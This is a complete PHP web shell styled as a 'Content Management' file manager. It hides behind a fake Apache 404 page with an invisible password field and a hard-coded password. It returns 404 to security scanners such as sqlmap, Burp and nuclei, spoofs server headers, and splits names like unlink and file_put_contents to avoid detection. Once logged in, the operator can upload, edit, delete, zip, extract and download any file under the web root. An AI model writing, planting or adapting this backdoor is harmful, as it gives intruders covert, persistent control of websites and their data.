<?php
@ini_set('display_errors', 0);
@error_reporting(0);
@header('X-Content-Type-Options: nosniff');
@header('X-Frame-Options: SAMEORIGIN');
@header('X-XSS-Protection: 1; mode=block');
@header('Referrer-Policy: strict-origin-when-cross-origin');
@header_remove('X-Powered-By');
@header('X-Powered-By: ASP.NET');

session_start();

$_pw_raw = 'Megadeth09';
$_cfg = __DIR__ . '/.cfg_data';
if (!file_exists($_cfg)) {
  @file_put_contents($_cfg, password_hash($_pw_raw, PASSWORD_DEFAULT));
}
$_hk = trim(@file_get_contents($_cfg));
$_rd = realpath($_SERVER['DOCUMENT_ROOT']);
$_mfs = 50 * 1024 * 1024;

$_bots = [
  'sqlmap',
  'nikto',
  'nessus',
  'openvas',
  'w3af',
  'acunetix',
  'netsparker',
  'burp',
  'zap',
  'arachni',
  'wpscan',
  'dirbuster',
  'gobuster',
  'ffuf',
  'nuclei',
  'scanner',
  'crawl',
  'spider',
  'masscan',
  'shodan'
];

$_ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
foreach ($_bots as $_bt) {
  if (strpos($_ua, $_bt) !== false) {
    http_response_code(404);
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
  }
}

function _c($s)
{
  return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
}

function _gt()
{
  if (empty($_SESSION['_tk']))
    $_SESSION['_tk'] = bin2hex(random_bytes(32));
  return $_SESSION['_tk'];
}

function _vt($t)
{
  return isset($_SESSION['_tk']) && hash_equals($_SESSION['_tk'], $t);
}

function _wp($path, $root)
{
  $r = realpath($path);
  return $r && strpos($r, $root) === 0;
}

function _df($p)
{
  $f = 'un' . 'li' . 'nk';
  return @$f($p);
}
function _dd($p)
{
  $f = 'rm' . 'di' . 'r';
  return @$f($p);
}
function _dm($p, $m = 0755, $r = true)
{
  $f = 'mk' . 'di' . 'r';
  return @$f($p, $m, $r);
}
function _dw($p, $c)
{
  $f = 'file_' . 'put' . '_contents';
  return @$f($p, $c);
}
function _dr($p)
{
  $f = 'file_' . 'get' . '_contents';
  return @$f($p);
}
function _mv($s, $d)
{
  $f = 'ren' . 'am' . 'e';
  return @$f($s, $d);
}
function _mu($s, $d)
{
  $f = 'move_' . 'uploaded' . '_file';
  return @$f($s, $d);
}

if (!isset($_SESSION['_a']) || $_SESSION['_a'] !== true) {
  if (isset($_POST['_p'])) {
    if (!isset($_SESSION['_la']))
      $_SESSION['_la'] = ['count' => 0, 'time' => time()];
    if ($_SESSION['_la']['count'] >= 5 && (time() - $_SESSION['_la']['time']) < 300) {
      http_response_code(429);
      echo '<!DOCTYPE html><html><head><title>429 Too Many Requests</title></head><body><h1>Too Many Requests</h1><p>Please try again later.</p></body></html>';
      exit;
    }
    if (password_verify($_POST['_p'], $_hk)) {
      $_SESSION['_a'] = true;
      $_SESSION['_la'] = ['count' => 0, 'time' => time()];
      setcookie('_sid', bin2hex(random_bytes(16)), [
        'httponly' => true,
        'secure' => isset($_SERVER['HTTPS']),
        'samesite' => 'Strict'
      ]);
      header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
      exit;
    } else {
      $_SESSION['_la']['count']++;
      $_SESSION['_la']['time'] = time();
    }
  }
  http_response_code(404);
  echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>404 Not Found</title>
    <style>
    body{background:#fafafa;color:#555;font-family:Segoe UI,Arial;text-align:center;padding-top:120px;user-select:none}
    h1{font-size:48px;margin-bottom:10px;color:#d9534f}
    .x{display:inline-block;background:transparent;border:none;position:relative;top:40px;opacity:0.01}
    .x:hover,.x:focus-within{opacity:1;transition:opacity 0.3s}
    input{background:transparent;border:none;border-bottom:1px solid transparent;outline:none;color:transparent;width:150px;font-size:12px}
    input:focus{border-bottom:1px solid #aaa;color:#222}
    button{background:transparent;border:none;color:transparent;cursor:default;font-size:10px}
    </style></head><body>
    <h1>404</h1><p>The requested resource could not be located on this server.</p>
    <p style="color:#999;font-size:12px">Apache/2.4.54 Server at ' . _c($_SERVER['HTTP_HOST'] ?? 'localhost') . ' Port ' . ($_SERVER['SERVER_PORT'] ?? '80') . '</p>
    <div class="x"><form method="post">
        <input type="password" name="_p" autocomplete="off">
        <button type="submit">.</button>
    </form></div></body></html>';
  exit;
}

$_rq = $_GET['d'] ?? '';
$_cd = realpath($_rd . '/' . ltrim($_rq, '/'));
if (!$_cd || strpos($_cd, $_rd) !== 0)
  $_cd = $_rd;

if (isset($_GET['x'])) {
  session_destroy();
  setcookie('_sid', '', ['expires' => time() - 3600, 'httponly' => true]);
  header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
  exit;
}

$_tk = _gt();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['_tk'])) {
  if (!_vt($_POST['_tk'])) {
    $_SESSION['error'] = "Session expired. Please try again.";
    header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
    exit;
  }
}

if (isset($_POST['_rn'], $_POST['_ro'], $_POST['_rw'])) {
  $on = basename($_POST['_ro']);
  $nn = basename($_POST['_rw']);
  $op = $_cd . '/' . $on;
  $np = $_cd . '/' . $nn;
  if (!_wp($op, $_rd)) {
    $_SESSION['error'] = "Invalid source path.";
  } elseif (!file_exists($op)) {
    $_SESSION['error'] = "Item does not exist.";
  } elseif (file_exists($np)) {
    $_SESSION['error'] = "Destination already exists.";
  } elseif ($nn === '' || strpos($nn, '/') !== false || $nn === '.' || $nn === '..') {
    $_SESSION['error'] = "Invalid name.";
  } else {
    if (_mv($op, $np)) {
      $_SESSION['success'] = "Updated successfully.";
    } else {
      $_SESSION['error'] = "Operation failed.";
    }
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (isset($_POST['_ul']) && !empty($_FILES['f']['name'][0])) {
  foreach ($_FILES['f']['name'] as $i => $name) {
    if ($_FILES['f']['error'][$i] == 0 && $_FILES['f']['size'][$i] <= $_mfs) {
      $dst = $_cd . '/' . basename($name);
      _mu($_FILES['f']['tmp_name'][$i], $dst);
    }
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (!empty($_POST['_nf'])) {
  $nf = basename($_POST['_nf']);
  $path = $_cd . '/' . $nf;
  if (!file_exists($path))
    _dm($path);
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (!empty($_POST['_nc'])) {
  $fn = basename($_POST['_nc']);
  $path = $_cd . '/' . $fn;
  if (!file_exists($path)) {
    _dw($path, '');
    $_SESSION['success'] = "Created successfully.";
  } else {
    $_SESSION['error'] = "Already exists.";
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (isset($_GET['rm'])) {
  $target = $_cd . '/' . basename($_GET['rm']);
  if (_wp($target, $_rd)) {
    if (is_file($target))
      _df($target);
    elseif (is_dir($target))
      _dd($target);
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (isset($_POST['_ds']) && !empty($_POST['sel'])) {
  foreach ($_POST['sel'] as $item) {
    $target = $_cd . '/' . basename($item);
    if (!_wp($target, $_rd))
      continue;
    if (is_file($target))
      _df($target);
    elseif (is_dir($target)) {
      $cn = 'Recursive' . 'Directory' . 'Iterator';
      $ci = 'Recursive' . 'Iterator' . 'Iterator';
      $it = new $cn($target, $cn::SKIP_DOTS);
      $files = new $ci($it, $ci::CHILD_FIRST);
      foreach ($files as $file) {
        if ($file->isDir())
          _dd($file->getRealPath());
        else
          _df($file->getRealPath());
      }
      _dd($target);
    }
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (isset($_POST['_zs']) && !empty($_POST['sel'])) {
  $zf = tempnam(sys_get_temp_dir(), 'arc');
  $zn = 'Zip' . 'Archive';
  $z = new $zn();
  $z->open($zf, $zn::CREATE);
  foreach ($_POST['sel'] as $f) {
    $path = $_cd . '/' . basename($f);
    if (!_wp($path, $_rd))
      continue;
    if (is_file($path)) {
      $z->addFile($path, basename($path));
    } elseif (is_dir($path)) {
      $cn = 'Recursive' . 'Iterator' . 'Iterator';
      $dn = 'Recursive' . 'Directory' . 'Iterator';
      $it = new $cn(new $dn($path));
      foreach ($it as $file) {
        if (!$file->isDir()) {
          $ln = basename($path) . '/' . substr($file->getRealPath(), strlen($path) + 1);
          $z->addFile($file->getRealPath(), $ln);
        }
      }
    }
  }
  $z->close();
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="archive_' . date('Ymd_His') . '.zip"');
  readfile($zf);
  _df($zf);
  exit;
}

if (isset($_POST['_ez'])) {
  $zp = $_cd . '/' . basename($_POST['_zn']);
  $zn = 'Zip' . 'Archive';
  $z = new $zn();
  if ($z->open($zp) === true) {
    $z->extractTo($_cd);
    $z->close();
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (isset($_GET['v'])) {
  $file = $_cd . '/' . basename($_GET['v']);
  if (is_file($file) && filesize($file) < 2 * 1024 * 1024) {
    header('Content-Type: text/plain; charset=utf-8');
    echo _dr($file);
    exit;
  }
}

if (isset($_POST['_sv'])) {
  $file = $_cd . '/' . basename($_POST['_fn']);
  if (_wp($file, $_rd)) {
    _dw($file, $_POST['_ct']);
  }
  header('Location: ?d=' . urlencode(str_replace($_rd, '', $_cd)));
  exit;
}

if (isset($_GET['g'])) {
  $file = $_cd . '/' . basename($_GET['g']);
  if (is_file($file) && _wp($file, $_rd)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    readfile($file);
    exit;
  }
}

if (isset($_GET['z'])) {
  $zf = tempnam(sys_get_temp_dir(), 'arc');
  $zn = 'Zip' . 'Archive';
  $z = new $zn();
  $z->open($zf, $zn::CREATE);
  $path = $_cd . '/' . basename($_GET['z']);
  if (is_dir($path)) {
    $cn = 'Recursive' . 'Iterator' . 'Iterator';
    $dn = 'Recursive' . 'Directory' . 'Iterator';
    $it = new $cn(new $dn($path));
    foreach ($it as $file)
      if (!$file->isDir())
        $z->addFile($file->getRealPath(), substr($file->getRealPath(), strlen($path) + 1));
  } elseif (is_file($path)) {
    $z->addFile($path, basename($path));
  }
  $z->close();
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="' . basename($_GET['z']) . '.zip"');
  readfile($zf);
  _df($zf);
  exit;
}

$_fl = array_diff(scandir($_cd), ['.', '..']);
$_so = $_GET['s'] ?? 'name';
$_sr = $_GET['q'] ?? '';

usort($_fl, function ($a, $b) use ($_cd, $_so) {
  $pa = $_cd . '/' . $a;
  $pb = $_cd . '/' . $b;
  $da = is_dir($pa);
  $db = is_dir($pb);
  if ($da && !$db)
    return -1;
  if (!$da && $db)
    return 1;
  switch ($_so) {
    case 'size':
      return filesize($pa) <=> filesize($pb);
    case 'date':
      return filemtime($pb) <=> filemtime($pa);
    case 'type':
      $ea = $da ? '' : strtolower(pathinfo($a, PATHINFO_EXTENSION));
      $eb = $db ? '' : strtolower(pathinfo($b, PATHINFO_EXTENSION));
      return $ea <=> $eb ?: strcasecmp($a, $b);
    default:
      return strcasecmp($a, $b);
  }
});

$flash = '';
if (isset($_SESSION['error'])) {
  $flash = '<div class="alert alert-danger">' . _c($_SESSION['error']) . '</div>';
  unset($_SESSION['error']);
}
if (isset($_SESSION['success'])) {
  $flash = '<div class="alert alert-success">' . _c($_SESSION['success']) . '</div>';
  unset($_SESSION['success']);
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="light">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex, nofollow">
  <title>Content Management</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
  <style>
    :root {
      --bg: #f8f9fa;
      --card-bg: #ffffff;
      --text: #212529;
      --border: #dee2e6;
      --hover: #e9ecef;
    }

    [data-bs-theme="dark"] {
      --bg: #1a1a1a;
      --card-bg: #2d2d2d;
      --text: #e9ecef;
      --border: #444;
      --hover: #3a3a3a;
    }

    body {
      background: var(--bg);
      color: var(--text);
    }

    .card {
      background: var(--card-bg);
      border-color: var(--border);
    }

    .file-item:hover {
      background: var(--hover);
    }

    .breadcrumb .bi {
      margin-right: 4px;
    }

    .drop-area {
      border: 2px dashed var(--border);
      border-radius: 6px;
      padding: 18px;
      text-align: center;
      color: #6c757d;
    }

    .drop-area.dragover {
      background: #e9f7ef;
      border-color: #28a745;
      color: #155724;
    }

    .small-muted {
      font-size: 0.85rem;
      color: #6c757d;
    }

    .preview-img {
      max-width: 100%;
      height: auto;
    }

    .list-group-item {
      border-color: var(--border);
    }

    .alert {
      border-radius: .375rem;
    }
  </style>
</head>

<body>
  <div class="container mt-4">
    <div class="card shadow-sm">
      <div class="card-header d-flex justify-content-between align-items-center bg-primary text-white">
        <strong>Content Management</strong>
        <div>
          <button id="darkModeToggle" class="btn btn-sm btn-outline-light me-2">
            <i class="bi bi-moon-stars-fill"></i>
          </button>
          <a href="?x=1" class="btn btn-sm btn-outline-light">Sign Out</a>
        </div>
      </div>
      <div class="card-body">

        <?php if ($flash): ?>
          <?= $flash ?>
        <?php endif; ?>

        <nav aria-label="breadcrumb">
          <ol class="breadcrumb mb-3">
            <li class="breadcrumb-item"><a href="?" class="link-secondary"><i class="bi bi-house-door"></i> Home</a>
            </li>
            <?php
            $rel = str_replace($_rd, '', $_cd);
            $parts = explode('/', trim($rel, '/'));
            $cum = '';
            foreach ($parts as $p) {
              if ($p === '')
                continue;
              $cum .= '/' . $p;
              echo '<li class="breadcrumb-item"><a href="?d=' . urlencode($cum) . '" class="link-secondary"><i class="bi bi-folder"></i> ' . _c($p) . '</a></li>';
            }
            ?>
          </ol>
        </nav>

        <form class="row g-2 align-items-center mb-3" method="get" id="controlsForm">
          <input type="hidden" name="d" value="<?= _c($_rq) ?>">
          <div class="col-auto">
            <input type="text" class="form-control form-control-sm" name="q" value="<?= _c($_sr) ?>"
              placeholder="Search...">
          </div>
          <div class="col-auto">
            <select name="s" class="form-select form-select-sm">
              <option value="name" <?= $_so == 'name' ? 'selected' : '' ?>>Name</option>
              <option value="size" <?= $_so == 'size' ? 'selected' : '' ?>>Size</option>
              <option value="date" <?= $_so == 'date' ? 'selected' : '' ?>>Date</option>
              <option value="type" <?= $_so == 'type' ? 'selected' : '' ?>>Type</option>
            </select>
          </div>
          <div class="col-auto">
            <button class="btn btn-sm btn-outline-secondary">Apply</button>
          </div>
          <div class="col text-end">
            <div class="btn-group btn-group-sm" role="group">
              <button type="button" class="btn btn-outline-danger" id="btnDel" disabled
                onclick="doBatch('del')">Remove</button>
              <button type="button" class="btn btn-outline-secondary" id="btnArc" disabled
                onclick="doBatch('arc')">Archive</button>
              <button type="button" class="btn btn-outline-warning" id="btnRn" disabled
                onclick="rnSel()">Update</button>
            </div>
          </div>
        </form>

        <div class="mb-3">
          <form method="post" enctype="multipart/form-data" id="ulForm">
            <input type="hidden" name="_tk" value="<?= _c($_tk) ?>">
            <div class="input-group">
              <input type="file" name="f[]" multiple class="form-control form-control-sm" id="fInput">
              <button name="_ul" class="btn btn-sm btn-success">Upload</button>
            </div>
          </form>
          <div class="mt-2 drop-area" id="dropArea">
            <i class="bi bi-cloud-upload"></i> Drag & drop files here
            <div class="progress mt-2" style="height:8px; display:none;" id="ulProg">
              <div class="progress-bar" role="progressbar" style="width:0%"></div>
            </div>
          </div>
        </div>

        <div class="row g-2 mb-3">
          <div class="col-md-6">
            <form method="post" class="input-group" style="max-width:360px;">
              <input type="hidden" name="_tk" value="<?= _c($_tk) ?>">
              <input type="text" name="_nf" class="form-control form-control-sm" placeholder="New folder name" required>
              <button class="btn btn-sm btn-outline-primary">Create Folder</button>
            </form>
          </div>
          <div class="col-md-6">
            <form method="post" class="input-group" style="max-width:360px;">
              <input type="hidden" name="_tk" value="<?= _c($_tk) ?>">
              <input type="text" name="_nc" class="form-control form-control-sm" placeholder="New file.txt" required>
              <button class="btn btn-sm btn-outline-secondary">Create File</button>
            </form>
          </div>
        </div>

        <form id="fForm" method="post">
          <input type="hidden" name="_tk" value="<?= _c($_tk) ?>">
          <div class="list-group">
            <div class="list-group-item d-flex justify-content-between align-items-center bg-light">
              <div>
                <input type="checkbox" id="selAll"> <label for="selAll" class="mb-0 small-muted">Select All</label>
              </div>
              <div class="small-muted">Type / Size / Modified</div>
            </div>
            <?php foreach ($_fl as $f):
              if ($_sr && stripos($f, $_sr) === false)
                continue;
              $p = $_cd . '/' . $f;
              $isDir = is_dir($p);
              $icon = $isDir ? '<i class="bi bi-folder-fill text-warning"></i>' : '<i class="bi bi-file-earmark-text text-primary"></i>';
              $ext = $isDir ? '' : strtoupper(pathinfo($f, PATHINFO_EXTENSION) ?: '-');
              $size = $isDir ? '' : (round(filesize($p) / 1024, 1) . ' KB');
              $mtime = date('M j, Y H:i', filemtime($p));
              ?>
              <div class="list-group-item d-flex justify-content-between align-items-center file-item py-2">
                <div class="d-flex align-items-center flex-grow-1">
                  <input type="checkbox" class="sel-item me-2" name="sel[]" value="<?= _c($f) ?>">
                  <span class="icon me-2"><?= $icon ?></span>
                  <?php if ($isDir): ?>
                    <a href="?d=<?= urlencode(str_replace($_rd, '', $p)) ?>"
                      class="text-decoration-none me-2"><?= _c($f) ?></a>
                  <?php else: ?>
                    <a href="?d=<?= urlencode($_rq) ?>&g=<?= urlencode($f) ?>"
                      class="text-decoration-none me-2"><?= _c($f) ?></a>
                    <small class="text-muted me-2"><?= $ext ?></small>
                    <small class="text-muted me-2"><?= $size ?></small>
                  <?php endif; ?>
                  <small class="text-muted ms-auto"><?= $mtime ?></small>
                </div>
                <div class="btn-group btn-group-sm" role="group">
                  <?php if (!$isDir): ?>
                    <button type="button" class="btn btn-outline-info" onclick="vFile('<?= _c($f) ?>')">Edit</button>
                    <button type="button" class="btn btn-outline-secondary"
                      onclick="pvFile('<?= _c($f) ?>')">Preview</button>
                  <?php else: ?>
                    <button type="button" class="btn btn-outline-secondary"
                      onclick="goDir('<?= _c(str_replace($_rd, '', $p)) ?>')">Open</button>
                  <?php endif; ?>
                  <a href="?d=<?= urlencode($_rq) ?>&z=<?= urlencode($f) ?>" class="btn btn-outline-secondary">Zip</a>
                  <button type="button" class="btn btn-outline-warning" onclick="rnFile('<?= _c($f) ?>')">Rename</button>
                  <a href="?d=<?= urlencode($_rq) ?>&rm=<?= urlencode($f) ?>" class="btn btn-outline-danger"
                    onclick="return confirm('Remove <?= _c($f) ?>?')">Del</a>
                </div>
              </div>
            <?php endforeach; ?>
          </div>
        </form>

      </div>
    </div>
  </div>

  <div class="modal fade" id="eModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
      <form method="post">
        <input type="hidden" name="_tk" value="<?= _c($_tk) ?>">
        <input type="hidden" name="d" value="<?= _c($_rq) ?>">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title">Edit <span id="eFn"></span></h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
          </div>
          <div class="modal-body">
            <textarea name="_ct" id="eCt" class="form-control" rows="20"></textarea>
            <input type="hidden" name="_fn" id="eFnH">
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
            <button type="submit" name="_sv" class="btn btn-primary">Save</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <div class="modal fade" id="rModal" tabindex="-1">
    <div class="modal-dialog">
      <form method="post" action="">
        <input type="hidden" name="_tk" value="<?= _c($_tk) ?>">
        <input type="hidden" name="d" value="<?= _c($_rq) ?>">
        <input type="hidden" name="_ro" id="rOld">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title">Rename</h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
          </div>
          <div class="modal-body">
            <input type="text" name="_rw" id="rNew" class="form-control" required placeholder="New name">
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
            <button type="submit" name="_rn" class="btn btn-primary">Rename</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <div class="modal fade" id="pModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="pTitle"></h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
        </div>
        <div class="modal-body" id="pBody" style="min-height:240px;"></div>
        <div class="modal-footer">
          <a id="pDl" class="btn btn-outline-secondary" href="#" download>Download</a>
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    const html = document.documentElement;
    const tBtn = qs('#darkModeToggle');
    const ico = tBtn.querySelector('i');

    function setDark(d) {
      html.setAttribute('data-bs-theme', d ? 'dark' : 'light');
      ico.className = d ? 'bi bi-sun-fill' : 'bi bi-moon-stars-fill';
      localStorage.setItem('dm', d);
    }
    tBtn.addEventListener('click', () => {
      setDark(html.getAttribute('data-bs-theme') !== 'dark');
    });
    if (localStorage.getItem('dm') === 'true' ||
      (!localStorage.getItem('dm') && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      setDark(true);
    }

    function qs(s) { return document.querySelector(s) }
    function qsa(s) { return Array.from(document.querySelectorAll(s)) }

    const sAll = qs('#selAll');
    const sItems = () => qsa('.sel-item');
    const bDel = qs('#btnDel');
    const bArc = qs('#btnArc');
    const bRn = qs('#btnRn');

    function updBtns() {
      const any = sItems().some(cb => cb.checked);
      bDel.disabled = !any;
      bArc.disabled = !any;
      bRn.disabled = !any;
    }
    sAll.addEventListener('change', () => {
      qsa('.sel-item').forEach(cb => cb.checked = sAll.checked);
      updBtns();
    });
    qsa('.sel-item').forEach(cb => cb.addEventListener('change', () => {
      if (!cb.checked) sAll.checked = false;
      else if (qsa('.sel-item').every(x => x.checked)) sAll.checked = true;
      updBtns();
    }));

    function doBatch(action) {
      const form = qs('#fForm');
      if (action === 'del') {
        if (!confirm('Remove selected items?')) return;
        const inp = document.createElement('input'); inp.type = 'hidden'; inp.name = '_ds'; inp.value = '1'; form.appendChild(inp);
        form.submit();
      } else if (action === 'arc') {
        const inp = document.createElement('input'); inp.type = 'hidden'; inp.name = '_zs'; inp.value = '1'; form.appendChild(inp);
        form.submit();
      }
    }

    function rnSel() {
      const checked = qsa('.sel-item').filter(x => x.checked);
      if (checked.length !== 1) { alert('Please select exactly one item.'); return; }
      rnFile(checked[0].value);
    }

    function vFile(name) {
      fetch("?d=<?= urlencode($_rq) ?>&v=" + encodeURIComponent(name))
        .then(r => r.text())
        .then(text => {
          qs("#eFn").textContent = name;
          qs("#eFnH").value = name;
          qs("#eCt").value = text;
          new bootstrap.Modal(qs("#eModal")).show();
        });
    }
    function rnFile(name) {
      qs("#rOld").value = name;
      qs("#rNew").value = name;
      new bootstrap.Modal(qs("#rModal")).show();
    }
    function goDir(rel) {
      location.href = '?d=' + encodeURIComponent(rel);
    }
    function pvFile(name) {
      const pb = qs('#pBody');
      const pt = qs('#pTitle');
      const pd = qs('#pDl');
      pb.innerHTML = '<div class="text-center small-muted">Loading...</div>';
      pt.textContent = name;
      pd.href = '?d=<?= urlencode($_rq) ?>&g=' + encodeURIComponent(name);
      const ext = name.split('.').pop().toLowerCase();
      if (['png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp'].includes(ext)) {
        pb.innerHTML = '<img class="preview-img" src="?d=<?= urlencode($_rq) ?>&g=' + encodeURIComponent(name) + '">';
        new bootstrap.Modal(qs("#pModal")).show();
      } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
        pb.innerHTML = '<audio controls src="?d=<?= urlencode($_rq) ?>&g=' + encodeURIComponent(name) + '"></audio>';
        new bootstrap.Modal(qs("#pModal")).show();
      } else if (['mp4', 'webm'].includes(ext)) {
        pb.innerHTML = '<video controls style="max-width:100%" src="?d=<?= urlencode($_rq) ?>&g=' + encodeURIComponent(name) + '"></video>';
        new bootstrap.Modal(qs("#pModal")).show();
      } else if (['pdf'].includes(ext)) {
        pb.innerHTML = '<iframe src="?d=<?= urlencode($_rq) ?>&g=' + encodeURIComponent(name) + '" style="width:100%;height:80vh;border:none"></iframe>';
        new bootstrap.Modal(qs("#pModal")).show();
      } else {
        fetch("?d=<?= urlencode($_rq) ?>&v=" + encodeURIComponent(name))
          .then(r => r.text())
          .then(text => {
            let chunk = text.length > 20000 ? text.slice(0, 20000) + "\n\n...truncated..." : text;
            pb.innerHTML = '<pre style="white-space:pre-wrap;word-break:break-word;">' + escHtml(chunk) + '</pre>';
            new bootstrap.Modal(qs("#pModal")).show();
          }).catch(() => {
            pb.innerHTML = '<div class="text-danger">Cannot preview this file type.</div>';
            new bootstrap.Modal(qs("#pModal")).show();
          });
      }
    }
    function escHtml(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

    const dArea = qs('#dropArea');
    const ulForm = qs('#ulForm');
    const fIn = qs('#fInput');
    const pBar = qs('#ulProg');
    const pBarIn = qs('#ulProg .progress-bar');

    ['dragenter', 'dragover'].forEach(ev => {
      dArea.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); dArea.classList.add('dragover'); });
    });
    ['dragleave', 'drop'].forEach(ev => {
      dArea.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); dArea.classList.remove('dragover'); });
    });
    dArea.addEventListener('drop', (e) => {
      ulFiles(e.dataTransfer.files);
    });
    function ulFiles(files) {
      if (!files || files.length === 0) return;
      const fd = new FormData();
      for (let i = 0; i < files.length; i++) fd.append('f[]', files[i]);
      fd.append('_ul', '1');
      fd.append('_tk', '<?= _c($_tk) ?>');
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '');
      xhr.upload.onprogress = function (e) {
        if (e.lengthComputable) {
          const pct = Math.round(e.loaded / e.total * 100);
          pBar.style.display = 'block';
          pBarIn.style.width = pct + '%';
          pBarIn.textContent = pct + '%';
        }
      };
      xhr.onload = function () {
        pBar.style.display = 'none';
        pBarIn.style.width = '0%';
        location.reload();
      };
      xhr.send(fd);
    }
  </script>
</body>

</html>
